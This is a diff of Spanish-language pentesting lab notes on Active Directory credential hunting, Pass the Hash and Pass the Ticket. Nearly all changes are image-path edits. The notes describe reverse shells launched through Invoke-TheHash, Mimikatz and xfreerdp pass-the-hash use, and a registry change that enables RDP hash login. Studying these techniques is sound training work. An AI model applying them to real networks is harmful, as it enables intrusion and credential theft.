 Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`
 
@@ -1721,17 +1721,17 @@ DC01
 
 
 
-![Pasted image 20250708015148.png](/img/user/Pasted%20image%2020250708015148.png)
+![Pasted image 20250708015148.png](/img/user/imgs/Pasted%20image%2020250708015148.png)
 
 
-![Pasted image 20250708020249.png](/img/user/Pasted%20image%2020250708020249.png)
+![Pasted image 20250708020249.png](/img/user/imgs/Pasted%20image%2020250708020249.png)
 
 
 ``` css
 Enter-PSSession -ComputerName DC01
 ```
 
-![Pasted image 20250708020740.png](/img/user/Pasted%20image%2020250708020740.png)
+![Pasted image 20250708020740.png](/img/user/imgs/Pasted%20image%2020250708020740.png)
 
 
 
@@ -1749,7 +1749,7 @@ Un equipo Linux conectado a Active Directory suele usar ``Kerberos`` como métod
 
 Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una computadora ( LINUX01) conectado al controlador de dominio. 
 
-![Pasted image 20250708021848.png](/img/user/Pasted%20image%2020250708021848.png)
+![Pasted image 20250708021848.png](/img/user/imgs/Pasted%20image%2020250708021848.png)
 
 
 
@@ -1884,13 +1884,13 @@ smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home
 
 Todas las herramientas cubiertas en esta sección generan un ``'large amount of information'``, si bien ayudan con la automatización, generalmente se requiere una buena cantidad de revisión manual, ya que muchas coincidencias puede ser ``'false positive'``. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de *Snaffler* son:
 
-![Pasted image 20250702015444.png](/img/user/Pasted%20image%2020250702015444.png)
+![Pasted image 20250702015444.png](/img/user/imgs/Pasted%20image%2020250702015444.png)
 
 #### PowerHuntShares
 
 Otra herramienta que se puede utilizar es ``PowerHuntShares`` , un script de *PowerShell* que no necesariamente debe ejecutarse en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un ``HTML report`` al finalizar, se proporciona una interfaz de usuario fácil de usar para revisar los resultados:
 
-![Pasted image 20250702015847.png](/img/user/Pasted%20image%2020250702015847.png)
+![Pasted image 20250702015847.png](/img/user/imgs/Pasted%20image%2020250702015847.png)
 
 Podemos ejecutar un escaneo básico usando ``PowerHuntShares`` así: 
 
@@ -1916,16 +1916,16 @@ Esta función se describe con gran detalle en la wiki oficial . Un análisis bá
 {{CODE_BLOCK_37}}
 
 
-![Pasted image 20250702060047.png](/img/user/Pasted%20image%2020250702060047.png)
+![Pasted image 20250702060047.png](/img/user/imgs/Pasted%20image%2020250702060047.png)
 
-![Pasted image 20250702060341.png](/img/user/Pasted%20image%2020250702060341.png)
-
-
-
-![Pasted image 20250702215635.png](/img/user/Pasted%20image%2020250702215635.png)
+![Pasted image 20250702060341.png](/img/user/imgs/Pasted%20image%2020250702060341.png)
 
 
-![Pasted image 20250704011534.png](/img/user/Pasted%20image%2020250704011534.png)
+
+![Pasted image 20250702215635.png](/img/user/imgs/Pasted%20image%2020250702215635.png)
+
+
+![Pasted image 20250704011534.png](/img/user/imgs/Pasted%20image%2020250704011534.png)
 
 
 ---
@@ -1936,7 +1936,7 @@ Es una técnica que consiste en que un atacante utiliza un ``hash`` de contrase�
 
 Los ``ataques PtH`` explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático en cada sesión hasta que se cambia la contraseña. 
 
-![Pasted image 20250704024045.png](/img/user/Pasted%20image%2020250704024045.png)
+![Pasted image 20250704024045.png](/img/user/imgs/Pasted%20image%2020250704024045.png)
 
 
 > [!NOTE] NOTA:
@@ -1958,7 +1958,7 @@ Con NTLM, las contraseñas almacenadas en el servidor y el controlador de domini
 Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es ``MIMIKATZ``. ``Mimikatz`` tiene un módulo llamado `sekurlsa::pth`. Esto nos permite realizar un ataque PASS-THE-HASH iniciando un proceso con el hash de la password del usuario. Para usar el módulo necesitamos lo siguiente:
 
 
-![Pasted image 20250704025120.png](/img/user/Pasted%20image%2020250704025120.png)
+![Pasted image 20250704025120.png](/img/user/imgs/Pasted%20image%2020250704025120.png)
 
 #### Pass the hash from Windows using Mimikatz
 
@@ -1967,7 +1967,7 @@ Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es 
 
 Usaremos cmd.exe para ejecutar comandos en el contexto del usuario. Por ejemplo `julio` puede conectarse a una carpeta llamada `julio` en el DC.
 
-![Pasted image 20250704025326.png](/img/user/Pasted%20image%2020250704025326.png)
+![Pasted image 20250704025326.png](/img/user/imgs/Pasted%20image%2020250704025326.png)
 
 
 #### Pass the Hash with Powershell Invoke-TheHash (Windows)
@@ -1977,7 +1977,7 @@ Otra herramienta que podemos usar para realizar ataques de ``Pass the Hash`` en 
 La autenticación se realiza pasando un Hash NTML al protocolo de autenticación NTLMv2. `No se requieren privilegios de administrator local en el lado del cliente`, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo destino.
 
 
-![Pasted image 20250704025952.png](/img/user/Pasted%20image%2020250704025952.png)
+![Pasted image 20250704025952.png](/img/user/imgs/Pasted%20image%2020250704025952.png)
 
 
 
@@ -1991,12 +1991,12 @@ También podemos obtener una conexión de Shell inversa en la máquina de destin
 
 Para obtener un Shell inverso, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la ``dirección IP 172.16.1.5`` usaremos el puerto *8001* para esperar la conexión. 
 
-![Pasted image 20250704030231.png](/img/user/Pasted%20image%2020250704030231.png)
+![Pasted image 20250704030231.png](/img/user/imgs/Pasted%20image%2020250704030231.png)
 
 
 Para crear un Shell inverso simple usando ``PowerShell``, podemos visitar ``revshells.com`` , configurar nuestra IP ``172.16.1.5 ``y puerto ``8001``, y seleccione la opción PowerShell #3 (Base64), como se muestra en la siguiente imagen. 
 
-![Pasted image 20250704030309.png](/img/user/Pasted%20image%2020250704030309.png)
+![Pasted image 20250704030309.png](/img/user/imgs/Pasted%20image%2020250704030309.png)
 
 
 Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell inverso de PowerShell en el equipo de destino. Observe que, en lugar de proporcionar la dirección IP, que es ``172.16.1.10``, usaremos el nombre de la máquina DC01(cualquiera funcionaría). 
@@ -2010,7 +2010,7 @@ Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell
 El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10). 
 
 
-![Pasted image 20250704030521.png](/img/user/Pasted%20image%2020250704030521.png)
+![Pasted image 20250704030521.png](/img/user/imgs/Pasted%20image%2020250704030521.png)
 
 ## Pass the Hash with Impacket (Linux)
 
@@ -2071,7 +2071,7 @@ Este ataque tiene algunas salvedades:
 
 ``Restricted Admin Mode``, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:
 
-![Pasted image 20250707020740.png](/img/user/Pasted%20image%2020250707020740.png)
+![Pasted image 20250707020740.png](/img/user/imgs/Pasted%20image%2020250707020740.png)
 
 Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo ``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`` con el valor 0. Se puede hacer usando el siguiente comando:
 
@@ -2079,7 +2079,7 @@ Esto se puede habilitar agregando una nueva clave de registro `DisableRestricted
 
 {{CODE_BLOCK_45}}
 
-![Pasted image 20250707021048.png](/img/user/Pasted%20image%2020250707021048.png)
+![Pasted image 20250707021048.png](/img/user/imgs/Pasted%20image%2020250707021048.png)
 
 
 Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción ``/pth`` para obtener acceso RDP:
@@ -2089,7 +2089,7 @@ Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción 
 {{CODE_BLOCK_46}}
 
 
-![Pasted image 20250707021352.png](/img/user/Pasted%20image%2020250707021352.png)
+![Pasted image 20250707021352.png](/img/user/imgs/Pasted%20image%2020250707021352.png)
 
 
 # UAC Pass the Hash Limits for Local Accounts
@@ -2106,9 +2106,9 @@ El UAC (Control de cuentas de usuario) limita la capacidad de los usuarios local
 Estas configuraciones son solo para cuentas administrativas locales. Si accedemos a una cuenta de dominio con derechos administrativos en un equipo, podemos usar Pass-the-Hash en ese equipo.
 
 
-![Pasted image 20250707031058.png](/img/user/Pasted%20image%2020250707031058.png)
+![Pasted image 20250707031058.png](/img/user/imgs/Pasted%20image%2020250707031058.png)
 
-![Pasted image 20250707033800.png](/img/user/Pasted%20image%2020250707033800.png)
+![Pasted image 20250707033800.png](/img/user/imgs/Pasted%20image%2020250707033800.png)
 
 {{CODE_BLOCK_47}}
 
@@ -2124,7 +2124,7 @@ El sistema de autenticación Kerberos se basa en tickets. La idea central de Ker
 
 En su lugar, Kerberos conserva todos los tickets en el sistema local y presenta a cada servicio únicamente el ticket específico, lo que impide que un ticket se utilice para otro fin.
 
-![Pasted image 20250707213119.png](/img/user/Pasted%20image%2020250707213119.png)
+![Pasted image 20250707213119.png](/img/user/imgs/Pasted%20image%2020250707213119.png)
 
 Cuando un usuario solicita un TGT, deben autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su password. Una vez que el controlador de dominio valida la identidad del usuario (dado que el dominio conoce el hash de su password, lo que significa que puede descifrar la marca de tiempo), le envía un TGT para futuras solicitudes.
 
@@ -2134,7 +2134,7 @@ Una vez que el usuario recibe su ticket, no tiene que demostrar su identidad con
 
 Necesitamos un ticket ``Kerberos`` válido para realizar un ataque ``Pass the Ticket (PtT)``. Puede ser:
 
-![Pasted image 20250707214358.png](/img/user/Pasted%20image%2020250707214358.png)
+![Pasted image 20250707214358.png](/img/user/imgs/Pasted%20image%2020250707214358.png)
 
 Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`
 
@@ -2222,15 +2222,15 @@ El comando anterior abrirá una nueva ventana de comandos. Desde allí, podemos 
 
 
 
-![Pasted image 20250708015148.png](/img/user/Pasted%20image%2020250708015148.png)
+![Pasted image 20250708015148.png](/img/user/imgs/Pasted%20image%2020250708015148.png)
 
 
-![Pasted image 20250708020249.png](/img/user/Pasted%20image%2020250708020249.png)
+![Pasted image 20250708020249.png](/img/user/imgs/Pasted%20image%2020250708020249.png)
 
 
 {{CODE_BLOCK_53}}
 
-![Pasted image 20250708020740.png](/img/user/Pasted%20image%2020250708020740.png)
+![Pasted image 20250708020740.png](/img/user/imgs/Pasted%20image%2020250708020740.png)
 
 
 
@@ -2248,7 +2248,7 @@ Un equipo Linux conectado a Active Directory suele usar ``Kerberos`` como métod
 
 Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una computadora ( LINUX01) conectado al controlador de dominio. 
 
-![Pasted image 20250708021848.png](/img/user/Pasted%20image%2020250708021848.png)
+![Pasted image 20250708021848.png](/img/user/imgs/Pasted%20image%2020250708021848.png)
 
 
 
@@ -2334,13 +2334,13 @@ Como atacantes, siempre buscamos credenciales. En máquinas unidas a un dominio 
 
 Todas las herramientas cubiertas en esta sección generan un ``'large amount of information'``, si bien ayudan con la automatización, generalmente se requiere una buena cantidad de revisión manual, ya que muchas coincidencias puede ser ``'false positive'``. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de *Snaffler* son:
 
-![Pasted image 20250702015444.png](/img/user/Pasted%20image%2020250702015444.png)
+![Pasted image 20250702015444.png](/img/user/imgs/Pasted%20image%2020250702015444.png)
 
 #### PowerHuntShares
 
 Otra herramienta que se puede utilizar es ``PowerHuntShares`` , un script de *PowerShell* que no necesariamente debe ejecutarse en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un ``HTML report`` al finalizar, se proporciona una interfaz de usuario fácil de usar para revisar los resultados:
 
-![Pasted image 20250702015847.png](/img/user/Pasted%20image%2020250702015847.png)
+![Pasted image 20250702015847.png](/img/user/imgs/Pasted%20image%2020250702015847.png)
 
 Podemos ejecutar un escaneo básico usando ``PowerHuntShares`` así: 
 
@@ -2366,16 +2366,16 @@ Esta función se describe con gran detalle en la wiki oficial . Un análisis bá
 {{CODE_BLOCK_37}}
 
 
-![Pasted image 20250702060047.png](/img/user/Pasted%20image%2020250702060047.png)
+![Pasted image 20250702060047.png](/img/user/imgs/Pasted%20image%2020250702060047.png)
 
-![Pasted image 20250702060341.png](/img/user/Pasted%20image%2020250702060341.png)
-
-
-
-![Pasted image 20250702215635.png](/img/user/Pasted%20image%2020250702215635.png)
+![Pasted image 20250702060341.png](/img/user/imgs/Pasted%20image%2020250702060341.png)
 
 
-![Pasted image 20250704011534.png](/img/user/Pasted%20image%2020250704011534.png)
+
+![Pasted image 20250702215635.png](/img/user/imgs/Pasted%20image%2020250702215635.png)
+
+
+![Pasted image 20250704011534.png](/img/user/imgs/Pasted%20image%2020250704011534.png)
 
 
 ---
@@ -2386,7 +2386,7 @@ Es una técnica que consiste en que un atacante utiliza un ``hash`` de contrase�
 
 Los ``ataques PtH`` explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático en cada sesión hasta que se cambia la contraseña. 
 
-![Pasted image 20250704024045.png](/img/user/Pasted%20image%2020250704024045.png)
+![Pasted image 20250704024045.png](/img/user/imgs/Pasted%20image%2020250704024045.png)
 
 
 > [!NOTE] NOTA:
@@ -2408,7 +2408,7 @@ Con NTLM, las contraseñas almacenadas en el servidor y el controlador de domini
 Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es ``MIMIKATZ``. ``Mimikatz`` tiene un módulo llamado `sekurlsa::pth`. Esto nos permite realizar un ataque PASS-THE-HASH iniciando un proceso con el hash de la password del usuario. Para usar el módulo necesitamos lo siguiente:
 
 
-![Pasted image 20250704025120.png](/img/user/Pasted%20image%2020250704025120.png)
+![Pasted image 20250704025120.png](/img/user/imgs/Pasted%20image%2020250704025120.png)
 
 #### Pass the hash from Windows using Mimikatz
 
@@ -2417,7 +2417,7 @@ Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es 
 
 Usaremos cmd.exe para ejecutar comandos en el contexto del usuario. Por ejemplo `julio` puede conectarse a una carpeta llamada `julio` en el DC.
 
-![Pasted image 20250704025326.png](/img/user/Pasted%20image%2020250704025326.png)
+![Pasted image 20250704025326.png](/img/user/imgs/Pasted%20image%2020250704025326.png)
 
 
 #### Pass the Hash with Powershell Invoke-TheHash (Windows)
@@ -2427,7 +2427,7 @@ Otra herramienta que podemos usar para realizar ataques de ``Pass the Hash`` en 
 La autenticación se realiza pasando un Hash NTML al protocolo de autenticación NTLMv2. `No se requieren privilegios de administrator local en el lado del cliente`, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo destino.
 
 
-![Pasted image 20250704025952.png](/img/user/Pasted%20image%2020250704025952.png)
+![Pasted image 20250704025952.png](/img/user/imgs/Pasted%20image%2020250704025952.png)
 
 
 
@@ -2441,12 +2441,12 @@ También podemos obtener una conexión de Shell inversa en la máquina de destin
 
 Para obtener un Shell inverso, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la ``dirección IP 172.16.1.5`` usaremos el puerto *8001* para esperar la conexión. 
 
-![Pasted image 20250704030231.png](/img/user/Pasted%20image%2020250704030231.png)
+![Pasted image 20250704030231.png](/img/user/imgs/Pasted%20image%2020250704030231.png)
 
 
 Para crear un Shell inverso simple usando ``PowerShell``, podemos visitar ``revshells.com`` , configurar nuestra IP ``172.16.1.5 ``y puerto ``8001``, y seleccione la opción PowerShell #3 (Base64), como se muestra en la siguiente imagen. 
 
-![Pasted image 20250704030309.png](/img/user/Pasted%20image%2020250704030309.png)
+![Pasted image 20250704030309.png](/img/user/imgs/Pasted%20image%2020250704030309.png)
 
 
 Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell inverso de PowerShell en el equipo de destino. Observe que, en lugar de proporcionar la dirección IP, que es ``172.16.1.10``, usaremos el nombre de la máquina DC01(cualquiera funcionaría). 
@@ -2460,7 +2460,7 @@ Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell
 El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10). 
 
 
-![Pasted image 20250704030521.png](/img/user/Pasted%20image%2020250704030521.png)
+![Pasted image 20250704030521.png](/img/user/imgs/Pasted%20image%2020250704030521.png)
 
 ## Pass the Hash with Impacket (Linux)
 
@@ -2521,7 +2521,7 @@ Este ataque tiene algunas salvedades:
 
 ``Restricted Admin Mode``, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:
 
-![Pasted image 20250707020740.png](/img/user/Pasted%20image%2020250707020740.png)
+![Pasted image 20250707020740.png](/img/user/imgs/Pasted%20image%2020250707020740.png)
 
 Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo ``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`` con el valor 0. Se puede hacer usando el siguiente comando:
 
@@ -2529,7 +2529,7 @@ Esto se puede habilitar agregando una nueva clave de registro `DisableRestricted
 
 {{CODE_BLOCK_45}}
 
-![Pasted image 20250707021048.png](/img/user/Pasted%20image%2020250707021048.png)
+![Pasted image 20250707021048.png](/img/user/imgs/Pasted%20image%2020250707021048.png)
 
 
 Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción ``/pth`` para obtener acceso RDP:
@@ -2539,7 +2539,7 @@ Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción 
 {{CODE_BLOCK_46}}
 
 
-![Pasted image 20250707021352.png](/img/user/Pasted%20image%2020250707021352.png)
+![Pasted image 20250707021352.png](/img/user/imgs/Pasted%20image%2020250707021352.png)
 
 
 # UAC Pass the Hash Limits for Local Accounts
@@ -2556,9 +2556,9 @@ El UAC (Control de cuentas de usuario) limita la capacidad de los usuarios local
 Estas configuraciones son solo para cuentas administrativas locales. Si accedemos a una cuenta de dominio con derechos administrativos en un equipo, podemos usar Pass-the-Hash en ese equipo.
 
 
-![Pasted image 20250707031058.png](/img/user/Pasted%20image%2020250707031058.png)
+![Pasted image 20250707031058.png](/img/user/imgs/Pasted%20image%2020250707031058.png)
 
-![Pasted image 20250707033800.png](/img/user/Pasted%20image%2020250707033800.png)
+![Pasted image 20250707033800.png](/img/user/imgs/Pasted%20image%2020250707033800.png)
 
 {{CODE_BLOCK_47}}
 
@@ -2574,7 +2574,7 @@ El sistema de autenticación Kerberos se basa en tickets. La idea central de Ker
 
 En su lugar, Kerberos conserva todos los tickets en el sistema local y presenta a cada servicio únicamente el ticket específico, lo que impide que un ticket se utilice para otro fin.
 
-![Pasted image 20250707213119.png](/img/user/Pasted%20image%2020250707213119.png)
+![Pasted image 20250707213119.png](/img/user/imgs/Pasted%20image%2020250707213119.png)
 
 Cuando un usuario solicita un TGT, deben autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su password. Una vez que el controlador de dominio valida la identidad del usuario (dado que el dominio conoce el hash de su password, lo que significa que puede descifrar la marca de tiempo), le envía un TGT para futuras solicitudes.
 
@@ -2584,7 +2584,7 @@ Una vez que el usuario recibe su ticket, no tiene que demostrar su identidad con
 
 Necesitamos un ticket ``Kerberos`` válido para realizar un ataque ``Pass the Ticket (PtT)``. Puede ser:
 
-![Pasted image 20250707214358.png](/img/user/Pasted%20image%2020250707214358.png)
+![Pasted image 20250707214358.png](/img/user/imgs/Pasted%20image%2020250707214358.png)
 
 Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`
 
@@ -2672,15 +2672,15 @@ El comando anterior abrirá una nueva ventana de comandos. Desde allí, podemos 
 
 
 
-![Pasted image 20250708015148.png](/img/user/Pasted%20image%2020250708015148.png)
+![Pasted image 20250708015148.png](/img/user/imgs/Pasted%20image%2020250708015148.png)
 
 
-![Pasted image 20250708020249.png](/img/user/Pasted%20image%2020250708020249.png)
+![Pasted image 20250708020249.png](/img/user/imgs/Pasted%20image%2020250708020249.png)
 
 
 {{CODE_BLOCK_53}}
 
-![Pasted image 20250708020740.png](/img/user/Pasted%20image%2020250708020740.png)
+![Pasted image 20250708020740.png](/img/user/imgs/Pasted%20image%2020250708020740.png)
 
 
 
@@ -2698,7 +2698,7 @@ Un equipo Linux conectado a Active Directory suele usar ``Kerberos`` como métod
 
 Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una computadora ( LINUX01) conectado al controlador de dominio. 
 
-![Pasted image 20250708021848.png](/img/user/Pasted%20image%2020250708021848.png)
+![Pasted image 20250708021848.png](/img/user/imgs/Pasted%20image%2020250708021848.png)
 
 
 
